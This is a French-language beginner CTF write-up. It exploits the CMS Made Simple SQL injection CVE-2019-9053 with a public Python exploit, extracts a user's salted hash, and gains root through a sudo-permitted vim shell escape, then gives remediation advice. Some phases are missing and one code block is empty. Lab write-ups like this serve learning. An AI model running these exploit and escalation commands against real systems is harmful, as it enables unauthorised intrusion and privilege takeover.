### Objectif

CTF de niveau débutant axé sur les techniques fondamentales de test d'intrusion

### Techniques utilisées

Énumération du réseau, énumération web, exploitation des injections SQL, force brute SSH, élévation de privilèges via des binaires mal configurés

## Phase 3: CMS Simple Exploration

L'accès à `http://lab.thm/simple` révèle une installation de CMS Made Simple. La version est indiquée en bas de la page : CMS Made Simple version 2.2.8.

En recherchant sur Google une vulnérabilité pour cette version on tombe sur  **CMS Made Simple < 2.2.10 — SQL Injection (CVE-2019–9053).** 

Il s'agit d'une vulnérabilité d'injection SQL à laquelle notre version est sensible !

Pour exploiter cette vulnérabilité j’ai utiliser le script python de Dh4nuJ4

```bash
git clone https://github.com/Dh4nuJ4/SimpleCTF-UpdatedExploit.git
cd SimpleCTF-UpdatedExploit
pip install requests termcolor
```

Ensuite démarons l’exploit 

```bash
python3 updated_46635.py -u http://lab.thm/simple
```

Après exécution, l’exploit découvre:

- Username: mitch
- Salt: 1dac0d92e9fa6bb2
- Password: 0c01f4468bd75d7a84c7eb73846e8d96
- Email: admin@admin.com

Crackons ce hash avec  john. Pour ça on copie le contenu dans un fichier hash.txt suivant le format username:password$salt

```

```


## Phase6:  Escalade de privilège

Vérifions nos droits

```bash
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
mitch@Machine:~$ 
```

On peut donc utiliser `vim` en tant que root sans avoir à fournir de mot de passes. Or vim nous permet d’exécuter des commandes système via 

```bash
vim -c ':!commande'
```

Nous pouvons donc lancer un shell en tant que root

```bash
sudo vim -c ':!/bin/bash'
```

```bash
mitch@Machine:~$ sudo vim -c ':!/bin/bash'

root@Machine:~# whoami
root
root@Machine:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Machine:~# 
```

Nous pouvons alors récupérer le flag root


## Résumé

Ce CTF, accessible aux débutants, m'a permis d'apprendre plusieurs concepts fondamentaux des tests d'intrusion :

### Chaîne d'attaque

1. **Énumération du réseau** → Découverte des services FTP, HTTP et SSH
2. **Accès FTP anonyme** → Découverte d'une note suggérant des identifiants faibles
3. **Énumération Web** → Découverte de l'installation de CMS Made Simple
4. **Injection SQL** → Exploitation de la vulnérabilité CVE-2019-9053 pour extraire des identifiants
5. **Élévation de privilèges** → Exploitation d'une configuration incorrecte des permissions sudo sur vim

### Recommandations correctives

- Injection SQL : Toujours utiliser des requêtes paramétrées et maintenez le CMS à jour.
- Politique de mots de passe : Exigez des mots de passe robustes.
- Configuration sudo : Soyez extrêmement prudent lorsque vous accordez les privilèges NOPASSWD, en particulier pour les éditeurs comme vim qui peuvent exécuter des commandes shell.
- Principe du moindre privilège : Les utilisateurs ne doivent disposer que des permissions minimales nécessaires.
